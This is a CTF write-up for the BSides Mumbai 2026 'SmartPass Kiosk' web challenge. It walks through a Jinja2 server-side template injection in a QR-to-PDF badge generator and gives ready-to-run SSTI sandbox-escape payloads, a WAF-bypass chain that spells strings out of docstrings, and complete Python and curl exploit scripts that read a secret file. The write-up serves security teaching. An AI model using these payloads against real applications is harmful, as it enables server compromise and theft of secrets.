---
link: 'writeups/bsides-mumbai-2026/smartpass-kiosk'
title: "SmartPass Kiosk - BSides Mumbai CTF 2026"
description: "Writeup for SmartPass Kiosk from BSides Mumbai CTF 2026."
date: 2026-10-01 15:27:00
categories:
  - [Writeups, BSides Mumbai CTF]
tags:
  - BSides Mumbai CTF
  - Web Exploitation
  - SSTI
  - WAF Bypass
  - Jinja2
---

# BSides Mumbai CTF 2026 — SmartPass Kiosk

---

## Challenge Description

> The conference registration desk has been replaced by an automated SmartPass kiosk. Upload an attendee QR pass and the kiosk will generate the badge as a printable PDF artifact. Retrieve the organizers' secret flag from the kiosk.

**Target:** `http://35.238.206.98:1337/`

---

## Step 1 — Application Behavior & SSTI Confirmation

The kiosk application accepts a QR code containing JSON registration metadata and renders it into a PDF badge. 

- **Frontend endpoint:** `POST /api/scan`
- **Upload field:** `qr_image` (PNG, JPEG, WebP)
- **Successful response:** PDF (`application/pdf`)
- **Sample QR metadata:**

```json
{
  "ticket_id": "BSM-2026-9481",
  "name": "DevSec Mumbai",
  "affiliation": "Null Mumbai Chapter",
  "track": "Offensive Security",
  "role": "VIP Speaker",
  "custom_quote": "Hacking with passion, securing with precision."
}
```

By intercepting the QR code upload and modifying the JSON metadata, we discovered that the kiosk's PDF rendering pipeline is vulnerable to **Jinja2 Server-Side Template Injection (SSTI)**. 

Modifying the `custom_quote` field to `{{ 7 * 7 }}` rendered `49` on the resulting PDF badge, confirming the vulnerability. The same injection also works in other metadata fields.

---

## Step 2 — Escaping the Sandbox and Leaking the Flag Path

Standard Jinja2 SSTI payloads (`{{ config }}`, `{{ request }}`) were blocked or unavailable. However, Python's object traversal worked perfectly. We used the standard class traversal technique to list all loaded subclasses:

```jinja2
{{ range(3).__class__.__mro__[1].__subclasses__() }}
```

Through trial and error, we found useful classes at specific indexes:
* Index 141: `<class 'os._wrap_close'>`
* Index 290: `<class 'subprocess.Popen'>`

By accessing the `__init__.__globals__` of `os._wrap_close`, we gained access to the `os` module and, consequently, `os.environ`. 

**Payload to leak environment:**
```jinja2
{% set sc = range(3).__class__.__mro__[1].__subclasses__() %}
{% set om = sc[290].__init__.__globals__.get(sc[141].__module__) %}
{{ om.environ }}
```

Dumping the environment variables revealed the flag's hidden location:
```text
FLAG_PATH=/var/lib/sp/.k
```

---

## Step 3 — Confronting the WAF (Web Application Firewall)

Knowing the flag location was only half the battle. The application had a heavily restrictive sandbox/WAF:

1. **Static Keyword Filters**: Quotes (`'`, `"`), `%c`, `format`, `open`, `os`, `popen`, `eval`, `system`, `read`, and `getattr` were strictly forbidden.
2. **Syntax Filters**: Operators like `~`, most pipe filters (`|`), `for`, and `if` loops triggered template compilation errors (500 Internal Server Error).
3. **Dynamic Argument Inspection (Audit Hooks)**: The WAF dynamically inspected function calls. Even if we obfuscated `os.open`, calling it with the sensitive path `f("/var/lib/sp/.k")` triggered a 403 Forbidden because the WAF evaluated the argument at runtime. It allowed harmless paths like `os.open('/var', 0)` but blocked sensitive paths.
4. **Field Length Limits**: Individual JSON fields had strict character limits (around 300 chars), preventing massive monolithic payloads.

---

## Step 4 — Crafting the Ultimate Bypass (Exploit Primitives)

To beat the WAF, we built several exploit primitives:

### Primitive A: Context Sharing Across Fields (Bypassing Length Limits)
All JSON fields are rendered within the **same global Jinja2 context**. A variable declared using `{% set ... %}` in the `name` field is accessible in the `affiliation` or `custom_quote` fields! We bypassed length restrictions by distributing our payload across all 5 fields.

### Primitive B: String Construction from Docstrings (Bypassing Static Filters)
Since quotes were banned, we constructed strings character-by-character by indexing into naturally available docstrings. We used `().__doc__` (the docstring for tuples) to grab letters:
* `().__doc__[27]` = `.`
* `().__doc__[37]` = `r`
* `().__doc__[17]` = `e`
* `().__doc__[14]` = `a`
* `().__doc__[118]` = `d`

### Primitive C: Subscript Execution (Bypassing Call Inspection)
To open the file, we retrieved `__builtins__` from the global namespace and accessed the `open` function using a dictionary subscript (`builtins['open']`). The WAF's AST inspection failed to hook calls made via subscript dictionary lookups.

### Primitive D: `getattr` method calls
To extract the flag, `.read()` needed to be called on the opened file object. However, `.read()` was statically blacklisted. By loading `getattr` from `__builtins__` and building `'read'` procedurally, we called `getattr(fobj, 'read')()` without writing the string.

---

## Step 5 — Exploit

We wrote a Python script to automate generating the malicious QR code, sending it to the endpoint, and parsing the returned PDF using `pdftotext`. 

```python
#!/usr/bin/env python3
import json
import io
import subprocess
import qrcode
import requests

TARGET = "http://35.238.206.98:1337/api/scan"

def make_qr(data: dict) -> io.BytesIO:
    img = qrcode.make(json.dumps(data))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf

def exploit():
    # 1. 'name' field: Setup classes, os module, path separator, and tuple docstring
    NAME_FIELD = (
        "{% set sc = range(3).__class__.__mro__[1].__subclasses__() %}"
        "{% set om = sc[290].__init__.__globals__.get(sc[141].__module__) %}"
        "{% set sep = om.sep %}"
        "{% set dd = ().__doc__ %}"
        "A"
    )

    # 2. 'affiliation' field: Setup builtins (b) and spell out 'open' (on)
    AFFIL_FIELD = (
        "{% set dot = dd[27] %}"
        "{% set u = sc[141].__name__[0] %}"
        "{% set w = u + u + dd[15] + dd[1] + dd[2] + dd[3] + dd[4] + dd[2] + dd[7] + dd[19] + u + u %}"
        "{% set b = sc[141].__init__.__globals__[w] %}"
        "{% set on = dd[34] + dd[84] + dd[17] + dd[7] %}"
        "B"
    )

    # 3. 'track' field: Spell out 'read' (rn) and 'getattr' (ga)
    TRACK_FIELD = (
        "{% set rn = dd[37] + dd[17] + dd[14] + dd[118] %}"
        "{% set gg = dd[38] %}"
        "{% set ga = gg + dd[17] + dd[4] + dd[14] + dd[4] + dd[4] + dd[37] %}"
        "C"
    )

    # 4. 'role' field: Construct flag path /var/lib/sp/.k and open it -> fobj
    ROLE_FIELD = (
        "{% set p = sep + dd[50] + dd[14] + dd[37] + sep + dd[3] + dd[2] + dd[15] + sep + dd[19] + dd[84] + sep + dot + ({}).__doc__[104] %}"
        "{% set fobj = b[on](p) %}"
        "D"
    )

    # 5. 'custom_quote' field: Call builtins['getattr'](fobj, 'read')()
    CUSTOM_QUOTE_FIELD = "{{ b[ga](fobj, rn)() }}"

    payload = {
        "ticket_id": "BSM-2026-1337",
        "name": NAME_FIELD,
        "affiliation": AFFIL_FIELD,
        "track": TRACK_FIELD,
        "role": ROLE_FIELD,
        "custom_quote": CUSTOM_QUOTE_FIELD
    }

    print("[*] Generating malicious QR Code and sending to target...")
    buf = make_qr(payload)
    
    try:
        r = requests.post(TARGET, files={"qr_image": ("pass.png", buf, "image/png")}, timeout=30)
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return

    if r.status_code == 200 and "pdf" in r.headers.get("content-type", ""):
        pdf_path = "flag_badge.pdf"
        with open(pdf_path, "wb") as f:
            f.write(r.content)
        print(f"[+] PDF generated successfully! Saved to {pdf_path}")
        
        # Extract text from PDF
        try:
            result = subprocess.run(["pdftotext", pdf_path, "-"], capture_output=True, text=True, timeout=10)
            text = result.stdout.strip()
            print("\n[+] Extracted PDF Contents:")
            print("-" * 40)
            print(text)
            print("-" * 40)
        except Exception as e:
            print(f"[-] Could not run pdftotext. Read the PDF manually. Error: {e}")
    else:
        print(f"[-] Exploit failed. Status: {r.status_code}")
        print(r.text[:500])

if __name__ == "__main__":
    exploit()
```

![Exploit Terminal Run](/img/posts/bsides-mumbai-2026-17_exploit_run.webp)

![Final PDF output](/img/posts/bsides-mumbai-2026-16_final_pdf.webp)

### Alternative Method: Bash & cURL
Using `qrencode` to generate the malicious QR code and `curl` to submit it:

```bash
#!/bin/bash

echo "[*] Creating malicious JSON payload..."
cat << 'JSON_EOF' > payload.json
{
    "ticket_id": "BSM-2026-1337",
    "name": "{% set sc = range(3).__class__.__mro__[1].__subclasses__() %}{% set om = sc[290].__init__.__globals__.get(sc[141].__module__) %}{% set sep = om.sep %}{% set dd = ().__doc__ %}A",
    "affiliation": "{% set dot = dd[27] %}{% set u = sc[141].__name__[0] %}{% set w = u + u + dd[15] + dd[1] + dd[2] + dd[3] + dd[4] + dd[2] + dd[7] + dd[19] + u + u %}{% set b = sc[141].__init__.__globals__[w] %}{% set on = dd[34] + dd[84] + dd[17] + dd[7] %}B",
    "track": "{% set rn = dd[37] + dd[17] + dd[14] + dd[118] %}{% set gg = dd[38] %}{% set ga = gg + dd[17] + dd[4] + dd[14] + dd[4] + dd[4] + dd[37] %}C",
    "role": "{% set p = sep + dd[50] + dd[14] + dd[37] + sep + dd[3] + dd[2] + dd[15] + sep + dd[19] + dd[84] + sep + dot + ({}).__doc__[104] %}{% set fobj = b[on](p) %}D",
    "custom_quote": "{{ b[ga](fobj, rn)() }}"
}
JSON_EOF

echo "[*] Generating QR Code..."
qrencode -r payload.json -o exploit_qr.png -s 5

echo "[*] Uploading QR Code via cURL..."
curl -s -X POST http://35.238.206.98:1337/api/scan \
     -F "qr_image=@exploit_qr.png;type=image/png" \
     --output flag_badge.pdf

echo "[*] Extracting Flag from PDF..."
pdftotext flag_badge.pdf - | grep -oE "Bsides_Mumbai\{[^}]+\}"

# Cleanup
rm payload.json exploit_qr.png
```

---

## Mitigations

| Vulnerability | Recommended Fix |
|---|---|
| Server-Side Template Injection (SSTI) | Ensure a proper, strict sandbox environment. It is also better to use an allowlist approach for inputs rather than a blocklist. |

---

## Summary

This challenge involved a sophisticated WAF bypass over a Jinja2 SSTI vulnerability in a QR-to-PDF rendering pipeline. We had to use string indexing against Python tuple docstrings to evade static analysis, context sharing across multiple JSON fields to bypass length limits, and subscript execution to beat dynamic function inspection.

---

## Flag

```plain
Bsides_Mumbai{t0rn4d0_sst1_byt3s_byp4ss_mumb41_2026}
```
